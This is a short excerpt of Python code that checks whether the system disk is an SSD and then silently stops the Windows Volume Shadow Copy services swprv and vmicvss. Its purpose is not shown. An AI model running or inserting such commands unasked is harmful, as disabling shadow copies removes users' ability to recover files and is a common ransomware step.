...
try:
    ps_output = subprocess.check_output('powershell "Get-PhysicalDisk -DeviceNumber 0 | Select-Object -ExpandProperty MediaType"', shell=True).decode().strip()
    tipo_disco = 'SSD' if ps_output == 'SSD' else 'HDD'
except:
...
subprocess.call(['sc', 'stop', 'swprv'], stdout=devnull, stderr=devnull)
subprocess.call(['sc', 'stop', 'vmicvss'], stdout=devnull, stderr=devnull)
